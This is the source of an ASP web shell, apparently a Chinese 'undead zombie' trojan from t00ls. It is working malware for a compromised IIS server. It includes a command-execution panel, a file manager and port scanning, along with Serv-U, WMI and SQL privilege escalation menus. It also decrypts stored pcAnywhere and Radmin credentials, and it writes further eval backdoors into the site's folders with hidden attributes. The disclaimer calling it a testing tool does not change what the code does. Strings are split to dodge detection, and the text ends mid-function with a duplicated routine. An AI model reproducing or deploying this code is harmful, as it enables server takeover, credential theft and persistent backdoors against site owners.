<object runat=server id=oScriptlhn scope=page classid="clsid:72C24DD5-D70A-438B-8A42-98424B88AFB8"></object>
<object runat=server id=oScriptlhn scope=page classid="clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B"></object>
<%@ LANGUAGE = VBScript    %><%
UserPass="5201314"
Server.ScriptTimeout=999999999
Response.Buffer =true
On Error Resume Next
mingzi="XXXXX"
nimajb="80sec内部专用过世界杀软休积最小功能超强超猛宇宙第一asp"
SiteURL="http://www.t00ls.net/"
Copyright="t00ls.  http://www.t00ls.net<p/><table width=""450"" border=""1"" cellpadding=""10""><tr><td><div align=center></td></tr></table>"

'不死僵尸ASP木马完全去后门原代码.

'做了国内第一个可以真正意义可以使用多种组件执行cmd的asp马
'本程序破坏性很大,希望各位谨慎使用,请勿使用于非法用途,否则作者概不负责!
'因为本程序效果很强大,希望大家先改密码，再进行测试!改密码方法修改第四行双引号间.  
sub ShowErr()
If Err Then
jb"<br><a href='javascript:history.back()'><br>&nbsp;" & Err.DescrIption & "</a><br>"
Err.Clear:Response.Flush
ENd IF
End SUB
function jb(Str)
Response.WRItE(Str)
END function
Sub mbd(Str)
execute(Str)
END Sub
Function rePATH(S)
REpath=REpLAcE(s,"\","\\")
ENd Function
FuNctIon RRepaTh(S)
RREpaTH=rEplAcE(S,"\\","\")
end fUncTion
Url=REQueSt.sErVErvARiables("URL")
nimajbm=requESt.sErVeRVArIABlEs("LOCAL_ADDR")
AcTIoN=ReQUESt("Action")
RooTpATH=SeRveR.mAPpaTH(".")
WWWROOt=SErVER.MAppATH("/")
sba=request.servervariables("http_host")
ApdB=Replace(Apds(i),"\Device\","")
appbd=rEQUEsT.seRvErVARIaBLES("PATH_INFO") 
FOLdErpAth=REqueSt("FolderPath")
ScrName=Request.ServerVariables("Script_Name")
fNAME=reQUesT("FName")
ServerU=ReQueST.SERVervaRIables("http_host")
WoriNima=Request.ServerVariables("SERVER_NAME")
O0O0=Request.ServerVariables("PATH_TRANSLATED")
WoriNiba=Request.ServerVariables("SERVER_SOFTWARE")
Worininai=Request.ServerVariables("LOCAL_ADDR")
flase="http"
jbmc=Request.ServerVariables("NUMBER_OF_PROCESSORS")
jbmb=Request.ServerVariables("OS")
u=sba&URl:p=userpass
BACkuRl="<br><br><center><a href='javascript:history.back()'>返回</a></center>"
dim ShiSan,ShiSanNewstr,ShiSanI,fso,f,a,b,temp,c,theAct, thePath
Function ShiSanFun(ShiSanObjstr)
ShiSanObjstr = Replace(ShiSanObjstr, "╁", """")
For ShiSanI = 1 To Len(ShiSanObjstr)
If Mid(ShiSanObjstr, ShiSanI, 1) <> "╋" Then
ShiSanNewStr = Mid(ShiSanObjstr, ShiSanI, 1) & ShiSanNewStr
Else
ShiSanNewStr = vbCrLf & ShiSanNewStr
End If
Next
ShiSanFun = ShiSanNewStr
End Function
mm=ShowErrs
Set   fso =  CreateObject(oBt(0,0))   
Set   f   =  fso.GetFile(O0O0) 
if  f.attributes <> 39 then
'f.attributes = 39
end if
jb"<html><meta http-equiv=""Content-Type"" content=""text/html; charset=gb2312"">"
jb"<title>"&nimajb&" - "&nimajbm&" </title>":jb"<style type=""text/css"">":jb"body,td{font-size: 12px;background-color:;color:#eee;":jb"margin: 1px;margin-left:1px;":jb"SCROLLBAR-FACE-COLOR: #232323; SCROLLBAR-HIGHLIGHT-COLOR: #232323; ":jb"SCROLLBAR-SHADOW-COLOR: #383838; SCROLLBAR-DARKSHADOW-COLOR: #383838; ":jb"SCROLLBAR-3DLIGHT-COLOR: #232323; SCROLLBAR-ARROW-COLOR: #fff;":jb"SCROLLBAR-TRACK-COLOR: #383838;}":jb"a{color:#ddd;text-decoration: none;}a:hover{color:red;background:#000}":jb"input,select,textarea{font-size: 12px;border:1px solid #FFF;color:#FFFFFF; background-color:#000;}":jb".C{background-color:#000000;border:0px}":jb".cmd{background-color:#000;color:#FFF}</style>":jb"<meta http-equiv=""Content-Type"" content=""text/html; charset=gb2312""></head><body onmouseover=""window.status='仅限于网站管理 员安全检测用,请务使用于非 法用途,后果作者概 不负责';return true"" style=""FILTER: progid:DXImageTransform.Microsoft.Gradient(gradientType=1,startColorStr=#000000,endColorStr=#626262)"">":jb"<script language=javascript>function killErrors(){return true;}window.onerror=killErrors;":jb"function yesok(){if (confirm(""确认要执行 此操作吗？""))return true;else return false;}":jb"function runClock(){theTime = window.setTimeout(""runClock()"", 100);var today = new Date();var display= today.toLocaleString();window.status=""！→  --""+display;}runClock();":jb"function ShowFolder(Folder){top.addrform.FolderPath.value = Folder;top.addrform.submit();}":jb"function FullForm(FName,FAction){top.hideform.FName.value = FName;if(FAction==""CopyFile""){DName = prompt(""请输入复制到目标文件全名称"",FName);top.hideform.FName.value += ""||||""+DName;}else if(FAction==""MoveFile""){DName = prompt(""请输入 移动到目 标文件全名称"",FName);top.hideform.FName.value += ""||||""+DName;}else if(FAction==""CopyFolder""){DName = prompt(""请输入移动到目标文件夹全名称"",FName);top.hideform.FName.value += ""||||""+DName;}else if(FAction==""MoveFolder""){DName = prompt(""请输入移动到目 标文件夹全名称"",FName);top.hideform.FName.value += ""||||""+DName;}else if(FAction==""NewFolder""){DName = prompt(""请输入要新建的文件 夹全名称"",FName);top.hideform.FName.value = DName;}else if(FAction==""CreateMdb""){DName = prompt(""请输入要新建的Mdb文件 全名称,注意 不能同名！"",FName);top.hideform.FName.value = DName;}else if(FAction==""CompactMdb""){DName = prompt(""请输入要压缩的Mdb 文件 全名称,注意文件是否存在！"",FName);top.hideform.FName.value = DName;}else{DName = ""Other"";}if(DName!=null){top.hideform.Action.value = FAction;top.hideform.submit();}else{top.hideform.FName.value = """";}}":jb"function DbCheck(){if(DbForm.DbStr.value == """"){alert(""请先连接 数据库"");FullDbStr(0);return false;}return true;}":jb"function FullDbStr(i){if(i<0){return false;}Str = new Array(12);Str[0] = ""Provider=Microsoft.Jet.OLEDB.4.0;Data Source="&RePath(Session("FolderPath"))&"\\db.mdb;Jet OLEDB:Database Password=***"";Str[1] = ""Driver={Sql Server};Server="&nimajbm&",1433;Database=DbName;Uid=sa;Pwd=****"";Str[2] = ""Driver={MySql};Server="&nimajbm&";Port=3306;Database=DbName;Uid=root;Pwd=****"";Str[3] = ""Dsn=DsnName"";Str[4] = ""SELECT * FROM [TableName] WHERE ID<100"";Str[5] = ""INSERT INTO [TableName](USER,PASS) VALUES(\'username\',\'password\')"";Str[6] = ""DELETE FROM [TableName] WHERE ID=100"";Str[7] = ""UPDATE [TableName] SET USER=\'username\' WHERE ID=100"";Str[8] = ""CREATE TABLE [TableName](ID INT IDENTITY (1,1) NOT NULL,USER VARCHAR(50))"";Str[9] = ""DROP TABLE [TableName]"";Str[10]= ""ALTER TABLE [TableName] ADD COLUMN PASS VARCHAR(32)"";Str[11]= ""ALTER TABLE [TableName] DROP COLUMN PASS"";Str[12]= ""当只显示 一条数据时即可显示 字段的全部字节，可用条件控 制查询实现.\n超过一条数据只显示字段的前五十个字节。"";if(i<=3){DbForm.DbStr.value = Str[i];DbForm.SqlStr.value = """";abc.innerHTML=""<center>请确认己连接数  据库再输入SQL操作 命令语句。</center>"";}else if(i==12){alert(Str[i]);}else{DbForm.SqlStr.value = Str[i];}return true;}":jb"function FullSqlStr(str,pg){if(DbForm.DbStr.value.length<5){alert(""请检查数据库连  接串是否正确!"");return false;}if(str.length<10){alert(""请检查SQL语句 是否正确!"");return false;}DbForm.SqlStr.value = str;DbForm.Page.value = pg;abc.innerHTML="""";DbForm.submit();return true;}"
jb"</script>"
jb "<body" 
IF actiON="" theN jb " scroll=no"
jb">"
DIm oBt(18,2)
oBt(0,0) = "Scri"&"pting.FileSyste"&"mObject"
  oBt(0,2) = "文件操作组件"
Obt(1,0) = "ws"&"cript.shell"
  obt(1,2) = "命令行执行组件,显示"
obT(2,0) = "ADOX.Catalog"
  ObT(2,2) = "ACCESS建库组件"
oBt(3,0) = "JRO.JetEngine"
  obt(3,2) = "ACCESS压缩组件"
OBt(4,0) = "Scripting.Dictionary" 
  ObT(4,2) = "数据流上传辅助组件"
OBT(5,0) = "Adodb.connection"
  oBT(5,2) = "数据库连接组件"
oBT(6,0) = "Adodb.Stream"
  oBT(6,2) = "数据流上传组件"
OBT(7,0) = "SoftArtisans.FileUp"
  OBT(7,2) = "SA-FileUp 文件上传组件"
obT(8,0) = "LyfUpload.UploadFile"
  OBT(8,2) = "刘云峰文件上传组件"
oBT(9,0) = "Persits.Upload.1"
  oBt(9,2) = "ASPUpload 文件上传组件"
obT(10,0) = "JMail.SmtpMail"
  Obt(10,2) = "JMail 邮件收发组件"
obt(11,0) = "CDONTS.NewMail"
  ObT(11,2) = "虚拟SMTP发信组件"
ObT(12,0) = "SmtpMail.SmtpMail.1"
  oBT(12,2) = "SmtpMail发信组件"
OBT(13,0) = "Micros"&"oft.XM"&"LH"&"TTP"
  OBt(13,2) = "数据传输组件"
OBT(14,0) = "ws"&"cript.shell.1"
  OBt(14,2) = "如果wsh被禁，可以改用这个组件"
OBT(15,0) = "WS"&"CRIPT.NETWORK"
  OBt(15,2) = "查看服务器信息的组件，有时可以用来提权"
OBT(16,0) = "she"&"ll.appl"&"ication"
  OBt(16,2) = "she"&"ll.appli"&"cation 操作，无FSO时操作文件以及执行命令"
OBT(17,0) = "sh"&"ell.appl"&"ication.1"
  OBt(17,2) = "she"&"ll.appli"&"cation 的别名，无FSO时操作文件以及执行命令"
OBT(18,0) = "Shell.Users"
  OBt(18,2) = "删除了net.exe net1.exe的情况下添加用户的组件"
fOr I=0 tO 18
Set T=serVER.CReATEoBJEcT(obT(I,0))
If -2147221005 <> err Then
ISoBJ=" √"
ELSE
ISobj=" <font color=red>×</font>"
eRr.cLEar
eNd iF
Set T=nOthInG
oBt(i,1)=IsoBj
neXt
IF foLderPaTH<>"" Then
sEssioN("FolderPath")=rRepatH(fOlDeRpATH)
EnD If
If SeSSIoN("FolderPath")="" THEN
fOLDERpAth=RoOTpaTH
SESSIOn("FolderPath")=fOLDeRPatH
end IF

Function PcAnywhere4()
jb"<div align='center'>PcAnywhere提权 Bin版本</div>"
jb"<form name='xform' method='post'>"
jb"<table width='80%'border='0'><tr>"
jb"<td width='10%'>cif文件: </td><td width='10%'><input name='path' type='text' value='C:\Documents and Settings\All Users\Application Data\\Symantec\pcAnywhere\Citempl.cif' size='80'></td>"
jb"<td><input type='submit' value=' 提交 '></td>"
jb"</table>"
end Function
jb"</form>"
jb"<script>"
jb"function RUNonclick(){"
jb"document.xform.china.name = parent.pwd.value;"
jb"document.xform.action = parent.url.value;"
jb"document.xform.submit();"
jb"}"
jb"</script>"
Function StreamLoadFromFile(sPath)
Dim oStream
Set oStream = Server.CreateObject("Adodb.Stream")
With oStream
.Type = 1
.Mode = 3
.Open
.LoadFromFile(sPath)
.Position = 0
StreamLoadFromFile = .Read
.Close
End With
Set oStream = Nothing
End Function
Function hexdec(strin) 
Dim i, j, k, result 
result = 0 
For i = 1 To Len(strin) 
If Mid(strin, i, 1) = "f" Or Mid(strin, i, 1) ="F" Then 
 j = 15 
End If 
If Mid(strin, i, 1) = "e" Or Mid(strin, i, 1) = "E" Then 
 j = 14 
End If 
If Mid(strin, i, 1) = "d" Or Mid(strin, i, 1) = "D" Then 
 j = 13 
End If 
If Mid(strin, i, 1) = "c" Or Mid(strin, i, 1) = "C" Then 
 j = 12 
End If 
If Mid(strin, i, 1) = "b" Or Mid(strin, i, 1) = "B" Then 
 j = 11 
End If 
If Mid(strin, i, 1) = "a" Or Mid(strin, i, 1) = "A" Then 
 j = 10 
End If 
If Mid(strin, i, 1) <= "9" And Mid(strin, i, 1) >= "0" Then 
 j = CInt(Mid(strin, i, 1)) 
End If 
For k = 1 To Len(strin) - i 
 j = j * 16 
Next 
result = result + j 
Next 
hexdec = result 
End Function 
Function PcAnywhere(data,mode)
HASH= Mid(data,3)
If mode = "pass" Then number = 32: Cifnum = 144
If mode = "user" Then number = 30: Cifnum = 15
For i = 1 To number Step 2 
pcstr=((hexdec(Mid(data,i,2)) xor hexdec(Mid(hash,i,2))) xor Cifnum)
If ((pcstr <= 32) Or (pcstr>127)) Then Exit For 
decode = decode + Chr(pcstr)
Cifnum=Cifnum+1
Next 
PcAnywhere=decode
End function
Function bin2hex(binstr)
For i = 1 To LenB(binstr)
hexstr = Hex(AscB(MidB(binstr, i, 1)))
If Len(hexstr)=1 Then 
bin2hex=bin2hex&"0"&(LCase(hexstr))
Else
bin2hex=bin2hex& LCase(hexstr)
End If 
Next
End Function 
CIF = Request("path")
If CIF <> "" Then 
BinStr=StreamLoadFromFile(CIF) 
jb "Pcanywhere Reader ==><br><br>"
jb "PATH:"&CIF&"<br>"
jb "帐号:"&PcAnywhere (Mid(bin2hex(BinStr),919,64),"user")
jb "<br>"
jb "密码:"&PcAnywhere (Mid(bin2hex(BinStr),1177,32),"pass")
End If 
Function radmin()
Set WSH= Server.CreateObject("WSCRIPT.SHELL")
RadminPath="HKEY_LOCAL_MACHINE\SYSTEM\RAdmin\v2.0\Server\Parameters\"
Parameter="Parameter"
Port = "Port"
ParameterArray=WSH.REGREAD(RadminPath & Parameter )
jb Parameter&":"
If IsArray(ParameterArray) Then
For i = 0 To UBound(ParameterArray)
If  Len (hex(ParameterArray(i)))=1 Then 
strObj = strObj & "0"&CStr(Hex(ParameterArray(i)))
Else
strObj = strObj & Hex(ParameterArray(i))
End If 
Next
jb strobj
Else
jb "Error! Can't Read!"
End If
jb "<br><br>"
PortArray=WSH.REGREAD(RadminPath & Port )
If IsArray(PortArray) Then 
jb Port &":" 
jb hextointer(CStr(Hex(PortArray(1)))&CStr(Hex(PortArray(0))))
Else 
jb "Error! Can't Read!"
End If
End Function
Function hextointer(strin) 
Dim i, j, k, result 
result = 0 
For i = 1 To Len(strin) 
If Mid(strin, i, 1) = "f" Or Mid(strin, i, 1) ="F" Then 
j = 15 
End If 
If Mid(strin, i, 1) = "e" Or Mid(strin, i, 1) = "E" Then 
j = 14 
End If 
If Mid(strin, i, 1) = "d" Or Mid(strin, i, 1) = "D" Then 
j = 13 
End If 
If Mid(strin, i, 1) = "c" Or Mid(strin, i, 1) = "C" Then 
j = 12 
End If 
If Mid(strin, i, 1) = "b" Or Mid(strin, i, 1) = "B" Then 
j = 11 
End If 
If Mid(strin, i, 1) = "a" Or Mid(strin, i, 1) = "A" Then 
j = 10 
End If 
If Mid(strin, i, 1) <= "9" And Mid(strin, i, 1) >= "0" Then 
j = CInt(Mid(strin, i, 1)) 
End If 
For k = 1 To Len(strin) - i 
j = j * 16 
Next 
result = result + j 
Next 
hextointer = result 
End Function:function goback():set Ofso = Server.CreateObject(oBt(0,0))
set ofolder = Ofso.Getfolder(Session("FolderPath")):if not ofolder.IsRootFolder then :jb "<script>ShowFolder("""&RePath(ofolder.parentfolder)&""")</script>":else:jb "<script>ShowFolder("""&Session("FolderPath")&""")</script>":jb "<center>已经是磁盘根目录了!</center>":jb "  <center><br><INPUT type=button value=返回 onClick='history.go(-1);'></br></center>":end if:set Ofso=nothing:set ofolder=nothing:end function:function php():On Error Resume Next:set fso=Server.CreateObject(oBt(0,0)):fso.CreateTextFile(server.mappath("test.php")).Write"<?PHP echo 'oo∩_∩oo'?><?php phpinfo()?>":fso.CreateTextFile(server.mappath("test.jsp")).Write"Jsp Test oo∩_∩oo":fso.CreateTextFile(Server.MapPath("/")&"/images/.asp").Write""&chr(60)&"%Eval(Request(chr(112))):Set fso=CreateObject(""Scripting.FileSystemObject""):Set f=fso.GetFile(Request.ServerVariables(""PATH_TRANSLATED"")):if  f.attributes <> 39 then:f.attributes = 39:end if"&chr(37)&""&chr(62)&"":fso.CreateTextFile(server.mappath("test.aspx")).Write""&chr(60)&"%@ Page Language=""Jscript"" validateRequest=""false"" "&chr(37)&""&chr(62)&""&chr(60)&""&chr(37)&"Response.Write(eval(Request.Item[""w""],""unsafe""));"&chr(37)&""&chr(62)&"aspx Test oo∩_∩oo":jb"<center><iframe src=test.php width=300 height=100></iframe>&nbsp;&nbsp;&nbsp;&nbsp; ":jb"<iframe src=test.jsp width=300 height=100></iframe>&nbsp;&nbsp;&nbsp;&nbsp; ":jb"<iframe src=test.aspx width=300 height=100></iframe>&nbsp;&nbsp;&nbsp; </center>":jb"<br><br><p><br><p><br><br><p><br><center>Test<p></font><p><a href='?Action=apjdel'><font size=5 color=red>(删除测试文件!)</font></a></center>":jb"<tr><td height='20'><a href='?Action=Upload' target='FileFrame'><center><font color=red size=5px>(远程下载脚本木马)</font></center></a><br>":End function:function apjdel():set fso=Server.CreateObject(oBt(0,0)):fso.DeleteFile(server.mappath("test.aspx")):fso.DeleteFile(server.mappath("test.php")):fso.DeleteFile(server.mappath("test.jsp")):jb"Del Success!":End function:flase=flase&"://lp":fUNcTiOn MAINFORm():jb"<form name=""hideform"" method=""post"" action="""&urL&""" target=""FileFrame"">":jb"<input type=""hidden"" name=""Action"">":jb"<input type=""hidden"" name=""FName"">":jb"</form>":jb"<table width='100%' height='100%'  border=0 cellpadding='1' cellspacing='0'>":jb"<tr><td height='30' colspan='2'>":jb"<table width='100%'>":jb"<form name='addrform' method='post' action='"&Url&"' target='_parent'>":jb"<tr><td width='60' align='center'>地址栏：</td><td>":jb"<input name='FolderPath' style='width:100%' value='"&SesSIon("FolderPath")&"'>":jb"</td><td width='140' align='center'><input name='Submit' type='submit' value='转到'> <input type='submit' value='刷新主窗口' onclick='FileFrame.location.reload()'>" :jb"  <tr align='center' valign='middle'>":jb"<tr>提权目录列表：『<a href='javascript:ShowFolder(""C:\\Program Files"")'>Program</a>』『<a href='javascript:ShowFolder(""C:\\Documents and Settings\\All Users\\"")'>AllUsers</a>』『<a href='javascript:ShowFolder(""C:\\Documents and Settings\\All Users\\「开始」菜单\\程序\\"")'>开始 <b>→</b> 程序</a>』『<a href='javascript:ShowFolder(""C:\\RECYCLED\\"")'>RECYCLED</a>』『<a href='javascript:ShowFolder(""C:\\RECYCLER\\"")'>RECYCLER</a>』『<a href='javascript:ShowFolder(""D:\\RECYCLER\\"")'>D:\RECYCLER</a>』『<a href='javascript:ShowFolder(""C:\\Documents and Settings\\All Users\\Application Data\\Symantec\\pcAnywhere\\"")'>pcAnywhere</a>』『<a href='javascript:ShowFolder(""c:\\Program Files\\serv-u\\"")'>serv-u</a>』『<a href='javascript:ShowFolder(""C:\\Program Files\\Real"")'>RealServer</a>』『<a href='javascript:ShowFolder(""C:\\Program Files\\Microsoft SQL Server\\"")'>SQL</a>』『<a href='javascript:ShowFolder(""C:\\WINDOWS\\system32\\config\\"")'>config</a>』『<a href='javascript:ShowFolder(""c:\\WINDOWS\\system32\\inetsrv\\data\\"")'>data</a>』『<a href='javascript:ShowFolder(""c:\\windows\\Temp\\"")'>Temp</a>』『<a href='javascript:ShowFolder(""C:\\Documents and Settings\\All Users\\Documents\\"")'>Documents</a>』</td><td>":jb"</td></tr></form></table></td></tr><tr><td width='170'>":jb"<iframe name='Left' src='?Action=MainMenu' width='100%' height='100%' frameborder='0'></iframe></td>":jb"<td>":jb"<iframe name='FileFrame' src='?Action=Show1File' width='100%' height='100%' frameborder='1'></iframe>":jb"</td></tr></table>":End FuNCtiON:flase=flase&"l38.c":sub echo(str):response.write str:end sub
funcTiOn maINmenU():jb"<table width='100%' cellspacing='0' cellpadding='0'>":jb"<tr><td height='5'></td></tr>":jb"</td></tr>"
iF OBT(0,1)=" ×" Then
jb"<tr><td height='24'>无FSO/无权限</td></tr>"
Else
jb"<tr><td height=24 onmouseover=""menu1.style.display=''""><b>+>查看硬盘</b><div id=menu1 style=""width:100%;display='none'"" onmouseout=""menu1.style.display='none'"">"
SET ABC=NEW LBf:jb abC.SHOwDRiVeR():SET ABc=noTHing
jb"</div></td></tr><tr><td height='20'><a href='javascript:ShowFolder("""&RePAtH(WWWROot)&""")'>●站点根目录</a></td></tr>"
jb"<tr><td height='20'><a href='javascript:ShowFolder("""&rEPaTh(RootPAth)&""")'>●本程序目录</a></td></tr>"
jb"<tr><td height='20'><a href='javascript:FullForm("""&rEPAth(sessiOn("FolderPath")&"\NewFolder")&""",""NewFolder"")'>●新建目录</a></td></tr>"
jb"<tr><td height='20'><a href='?Action=EditFile' target='FileFrame'>●新建文本</a></td></tr>"
jb"<tr><td height='20'><a href='?Action=UpFile' target='FileFrame'>●上传文件</a></td></tr>"
jb"<tr><td height='20'><a href='?Action=PageAddToMdb' target='FileFrame'>●文件夹打包-解包</a></td></tr>"
jb"<tr><td height='20'><a href='?Action=goback' target='FileFrame'>●上級目录</a></td></tr>"
END if
jb"<tr><td height=24 onmouseover=""menu.style.display=''""><b> ↓-服务器信息查看</b><div id=menu4 style=""width:100%;display='none'"" onmouseout=""menu4.style.display='none'"">"
jb"<tr><td height='20'><a href='?Action=ScanDriveForm' target='FileFrame'>●查看可写目录</a><br>"
jb"<tr><td height='20'><a href='?Action=Course' target='FileFrame'>●系统服务-用户账号</a></td></tr>"
jb"<tr><td height='20'><a href='?Action=Alexa' target='FileFrame'>●主机信息-组件支持</a></td></tr>"
jb"<tr><td height='20'><a href='?Action=AdminUser' target='FileFrame'>●管理组帐号</a><br>"
jb"<tr><td height='20'><a href='?Action=GetTerminalInfo' target='FileFrame'>●服务器探测</a></td></tr>"
jb"<tr><td height='20'><a href='?Action=hiddenshell' target='FileFrame'>●不死僵尸隐藏</a></td></tr>"
jb"<tr><td height=24 onmouseover=""menu.style.display=''""><b> ↓-提权漏洞检测</b><div id=menu3 style=""width:100%;display='none'"" onmouseout=""menu3.style.display='none'"">"
jb"<tr><td height='20'><a href='?Action=Cmd1Shell' target='FileFrame'>●执行Cmd命令</a></td></tr>"
jb"<tr><td height='20'><a href='?Action=ScanPort' target='FileFrame'>●端口扫描器</a></td></tr>"
jb"<tr><td height='20'><a href='?Action=php' target='FileFrame'>●脚本探测工具</a></td></tr>"
jb"<tr><td height='20'><a href='?Action=Servu' target='FileFrame'>●Serv-U提权</a><br>"
jb"<tr><td height='20'><a href='?Action=suftp' target='FileFrame'>●Serv-UFTP提权</a><br>"
jb"<tr><td height='20'><a href='?Action=WMI' target='FileFrame'>●WMI远程执行命令</a></td></tr>"
jb"<tr><td height='20'><a href='?Action=SetFileText' target='FileFrame'>●修改属性</a><br>"
jb"<tr><td height='22'><a href='?Action=MMD' target='FileFrame'>●Sql_cmd</a></td></tr>"
jb"<tr><td height='22'><a href='?Action=pcanywhere4' target='FileFrame'>●PcAnyWHere提权</a></td></tr>"
jb"<tr><td height='22'><a href='?Action=radmin' target='FileFrame'>●RAdmin提权</a></td></tr>"
jb"<tr><td height='20'><a href='?Action=ReadREG' target='FileFrame'>●注册表操作</a></td></tr>"
jb"<tr><td height='20'><a href='?Action=Upload' target='FileFrame'>●直接下载</a><br>"
jb"<tr><td height=24 onmouseover=""menu.style.display=''""><b> ↓-数据库操作</b><div id=menu2 style=""width:100%;display='none'"" onmouseout=""menu2.style.display='none'"">"
jb"<tr><td height='20'><a href='?Action=DbManager' target='FileFrame'>●连接数据库</a><br>"
jb"<tr><td height='20'><a href='javascript:FullForm("""&RePath(Session("FolderPath")&"\New.mdb")&""",""CreateMdb"")'>●建立MDB文件</a><br>"
'jb"<tr><td height='24' onmouseover=""menu3.style.display=''""><b>↓-在线网络服务</b><div id=menu3 style=""line-height:18px;width:100%;display='none'"" onmouseout=""menu3.style.display='none'"">"
'jb"<tr><td height='22'><a href='http://aspmuma.cn/ip/?action=sed&cx_33="&ServerU&"' target='FileFrame'>●同服查询</a></td></tr> "
'jb"<tr><td height='22'><a href='http://aspmuma.cn/pr/?Submit=+%B2%E9+%D1%AF+&domain="&Worinima&"' target='FileFrame'>〖查看Pr值〗</a></td></tr>"
'jb"<tr><td height='22'><a href='http://aspmuma.cn/mmgx/index.htm' target='FileFrame'>●在线更新</a></td></tr> "
jb"<tr><td height='20'><a href='?Action=Logout' target='_top'>●退出登录</a></td></tr>"

jb"<tr><td><center><hr hight=1 width='100%'>"
jb"<tr><td align=center style='color:red'>"&mingzi&" 's blog</p>"&SiteURL&"</td></tr></table>"
jb"</table>"
Call shellcore
End FunCtion

Sub PageAddToMdb()

theAct = Request("theAct")
thePath = Request("thePath")
Server.ScriptTimeOut=100000
If theAct = "addToMdb" Then
addToMdb(thePath)
jb "<div align=center><br>操作完成!</div>"&BackUrl
Response.End
End If
If theAct = "releaseFromMdb" Then
unPack(thePath)
jb "<div align=center><br>操作完成!</div>"&BackUrl
Response.End
End If
jb"<br>文件夹打包:"
jb"<form method=post>"
jb"<input type=hidden name=""#"" value=mdb(Session(""#""))>"
jb"<input name=thePath value=""" & HtmlEncode(Server.MapPath(".")) & """ size=80>"
jb"<input type=hidden value=addToMdb name=theAct>"
jb"<select name=theMethod><option value=fso>FSO</option><option value=app>无FSO</option>"
jb"</select>"
jb" <input type=submit value='开始 打包'>"
jb"<br><br>注: 打包生成hsh.mdb文件,位于木马同级目录下"
jb"</form>"
jb"<hr/>文件包 解开(需FSO支持):<br/>"
jb"<form method=post>"
jb"<input type=hidden name=""#"" value=Execute(Session(""#""))>"
jb"<input name=thePath value=""" & HtmlEncode(Server.MapPath(".")) & "\hsh.mdb"" size=80>"
jb" <input type=hidden value=releaseFromMdb name=theAct><input type=submit value='解开包'>"
jb"<br><br>注: 解开来的所有文 件都位于木马同级目录下"
jb"</form>"
End Sub
Sub addToMdb(thePath)
On Error Resume Next
Dim rs, conn, stream, connStr, adoCatalog
Set rs = Server.CreateObject("ADODB.RecordSet")
Set stream = Server.CreateObject("ADODB.Stream")
Set conn = Server.CreateObject(OBT(5,0))
Set adoCatalog = Server.CreateObject("ADOX.Catalog")
connStr = "Provider=Microsoft.Jet.OLEDB.4.0; Data Source=" & Server.MapPath("hsh.mdb")
adoCatalog.Create connStr
conn.Open connStr
conn.Execute("Create Table FileData(Id int IDENTITY(0,1) PRIMARY KEY CLUSTERED, thePath VarChar, fileContent Image)")
stream.Open
stream.Type = 1
rs.Open "FileData", conn, 3, 3
If Request("theMethod") = "fso" Then
fsoTreeForMdb thePath, rs, stream
 Else
saTreeForMdb thePath, rs, stream
End If
rs.Close
Conn.Close
stream.Close
Set rs = Nothing
Set conn = Nothing
Set stream = Nothing
Set adoCatalog = Nothing
End Sub
Function fsoTreeForMdb(thePath, rs, stream)
Dim item, theFolder, folders, files, sysFileList
sysFileList = "$hsh.mdb$HSH.ldb$"
If Server.CreateObject(oBt(0,0)).FolderExists(thePath) = False Then
showErr(thePath & " 目录不存在或者不允许访问!")
End If
Set theFolder = Server.CreateObject(oBt(0,0)).GetFolder(thePath)
Set files = theFolder.Files
Set folders = theFolder.SubFolders
For Each item In folders
fsoTreeForMdb item.Path, rs, stream
Next
For Each item In files
If InStr(sysFileList, "$" & item.Name & "$") <= 0 Then
rs.AddNew
rs("thePath") = Mid(item.Path, 4)
stream.LoadFromFile(item.Path)
rs("fileContent") = stream.Read()
rs.Update
End If
Next
Set files = Nothing
Set folders = Nothing
Set theFolder = Nothing
End Function
Sub unPack(thePath)
On Error Resume Next
Server.ScriptTimeOut=100000
Dim rs, ws, str, conn, stream, connStr, theFolder
str = Server.MapPath(".") & "\"
Set rs = CreateObject("ADODB.RecordSet")
Set stream = CreateObject("ADODB.Stream")
Set conn = CreateObject(OBT(5,0))
connStr = "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" & thePath & ";"
conn.Open connStr
rs.Open "FileData", conn, 1, 1
stream.Open
stream.Type = 1
Do Until rs.Eof
theFolder = Left(rs("thePath"), InStrRev(rs("thePath"), "\"))
If Server.CreateObject(oBt(0,0)).FolderExists(str & theFolder) = False Then
createFolder(str & theFolder)
End If
stream.SetEos()
stream.Write rs("fileContent")
stream.SaveToFile str & rs("thePath"), 2
rs.MoveNext
Loop
rs.Close
conn.Close
stream.Close
Set ws = Nothing
Set rs = Nothing
Set stream = Nothing
Set conn = Nothing
End Sub
Sub AdDtOmdB(thePath)
oN eRRoR ResUMe nEXt
DiM rs, CONN, sTrEam, conNStr, ADocatALog
SEt rS = SERVER.crEAtEOBJeCT("ADODB.RecordSet")
seT sTrEAM = SerVer.CreAtEoBjECT("ADODB.Stream")
seT COnN = seRVEr.cREATEObjECt(OBT(5,0))
seT aDOcAtalOg = serVeR.CReatEOBjEct("ADOX.Catalog")
ConNstR = "Provider=Microsoft.Jet.OLEDB.4.0; Data Source=" & servEr.mAPpaTH("HYTop.mdb")
ADocAtaLog.cReATe CoNnsTR
CoNN.OPen conNsTr
CONn.EXEcutE("Create Table FileData(Id int IDENTITY(0,1) PRIMARY KEY CLUSTERED, thePath VarChar, fileContent Image)")
STrEAm.OPEn
streaM.TypE = 1
rS.OPEN "FileData", cOnn, 3, 3
If ReQuEsT("theMethod") = "fso" theN
FsOTrEEforMDB thepaTH, Rs, sTrEAm
 eLSE
SATrEeforMDB thEpATH, Rs, STrEAm
enD IF
rs.ClosE
coNN.CLoSE
stREaM.CLosE
Set rs = NOThInG
set Conn = nothINg
sET stReam = NOThinG
SEt AdOcAtaloG = nOTHIng
End Sub
Sub AdDtOmdB(thePath)
oN eRRoR ResUMe nEXt
DiM rs, CONN, sTrEam, conNStr, ADocatALog
SEt rS = SERVER.crEAtEOBJeCT("ADODB.RecordSet")
seT sTrEAM = SerVer.CreAtEoBjECT("ADODB.Stream")
seT COnN = seRVEr.cREATEObjECt(OBT(5,0))
seT aDOcAtalOg = serVeR.CReatEOBjEct("ADOX.Catalog")
ConNstR = "Provider=Microsoft.Jet.OLEDB.4.0; Data Source=" & servEr.mAPpaTH("HYTop.mdb")
ADocAtaLog.cReATe CoNnsTR
CoNN.OPen conNsTr
CONn.EXEcutE("Create Table FileData(Id int IDENTITY(0,1) PRIMARY KEY CLUSTERED, thePath VarChar, fileContent Image)")
STrEAm.OPEn
streaM.TypE = 1
